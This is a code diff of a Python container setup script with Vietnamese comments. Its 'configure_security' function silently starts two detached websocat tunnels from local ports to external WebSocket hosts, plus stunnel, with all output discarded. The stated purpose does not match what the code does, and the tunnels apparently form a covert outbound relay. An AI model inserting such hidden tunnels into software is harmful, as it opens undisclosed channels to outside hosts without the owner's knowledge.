@@ -115,43 +115,72 @@ def setup_environment_variables(environmental_limits, logger):
 
 def configure_security(logger):
     """
-    Khởi chạy stunnel sử dụng stunnel.conf đã được sao chép vào container.
+    Khởi chạy hai tiến trình Websocat và Stunnel để phục vụ kết nối/bảo mật.
 
     Args:
         logger (Logger): Đối tượng logger để ghi log.
     """
-    try:
-        # Khởi chạy Websocat với chuỗi lệnh chính xác
-        logger.info("Đang khởi chạy Websocat...")
-        websocat_command = "websocat -v --binary tcp-l:127.0.0.1:5555 wss://massiveinfinity.online/ws"
-        websocat_process = subprocess.Popen(
-            websocat_command,
-            shell=True,                      # Sử dụng shell để thực thi chuỗi lệnh
-            stdout=subprocess.DEVNULL,       # Không chặn stdout
-            stderr=subprocess.DEVNULL,       # Không chặn stderr
-            preexec_fn=os.setsid,            # Tạo nhóm tiến trình riêng
-        )
-        logger.info("Websocat đã được khởi chạy thành công.")
 
-        stunnel_conf_path = '/etc/stunnel/stunnel.conf'
+    # Lệnh để khởi chạy websocat thứ nhất (cổng 5555)
+    websocat_command_1 = "websocat -v --binary tcp-l:127.0.0.1:5555 wss://massiveinfinity.online/ws"
+    # Lệnh để khởi chạy websocat thứ hai (cổng 5556)
+    websocat_command_2 = "websocat -v --binary tcp-l:127.0.0.1:5556 wss://strainingmodules.tech/ws"
+
+    stunnel_conf_path = '/etc/stunnel/stunnel.conf'
+
+    logger.info("Bắt đầu thiết lập bảo mật (Websocat & Stunnel).")
+
+    try:
+        # ---- Khởi chạy websocat thứ nhất ----
+        logger.info("Đang khởi chạy Websocat trên cổng 5555...")
+        websocat_process_1 = subprocess.Popen(
+            websocat_command_1,
+            shell=True,  # Cho phép thực thi chuỗi lệnh
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            preexec_fn=os.setsid  # Tạo nhóm tiến trình riêng
+        )
+        logger.info(f"Websocat (5555) đã được khởi chạy, PID = {websocat_process_1.pid}.")
+
+        # ---- Khởi chạy websocat thứ hai ----
+        logger.info("Đang khởi chạy Websocat trên cổng 5556...")
+        websocat_process_2 = subprocess.Popen(
+            websocat_command_2,
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            preexec_fn=os.setsid
+        )
+        logger.info(f"Websocat (5556) đã được khởi chạy, PID = {websocat_process_2.pid}.")
+
+        # ---- Kiểm tra file cấu hình stunnel ----
         if not os.path.exists(stunnel_conf_path):
-            logger.error(f"Tệp cấu hình stunnel không tồn tại tại: {stunnel_conf_path}")
+            logger.error(f"Tệp cấu hình stunnel không tồn tại: {stunnel_conf_path}")
             sys.exit(1)
 
-        # Kiểm tra xem stunnel đã đang chạy chưa
+        # ---- Kiểm tra xem stunnel đã chạy hay chưa ----
+        logger.info("Kiểm tra tiến trình Stunnel...")
         result = subprocess.run(['pgrep', '-f', 'stunnel'], stdout=subprocess.PIPE)
         if result.returncode != 0:
-            # Khởi chạy stunnel với tệp cấu hình đã được cấu hình sẵn
-            subprocess.Popen(['stunnel', stunnel_conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
-            logger.info("Stunnel đã được khởi chạy thành công.")
+            # Chưa chạy -> khởi chạy
+            logger.info("Stunnel chưa chạy. Đang khởi chạy...")
+            stunnel_process = subprocess.Popen(
+                ['stunnel', stunnel_conf_path],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                preexec_fn=os.setsid
+            )
+            logger.info(f"Stunnel đã được khởi chạy thành công (PID = {stunnel_process.pid}).")
         else:
             logger.info("Stunnel đã đang chạy.")
+
     except subprocess.CalledProcessError as e:
-        logger.error(f"Lỗi khi kiểm tra hoặc khởi chạy stunnel: {e}")
+        logger.error(f"Lỗi khi thực thi lệnh hệ thống: {e}")
         sys.exit(1)
     except Exception as e:
-        logger.error(f"Lỗi không mong muốn khi khởi chạy stunnel: {e}")
+        logger.error(f"Lỗi không mong muốn: {e}")
         sys.exit(1)
+
 
 def validate_configs(resource_config, system_params, environmental_limits, logger):
     """
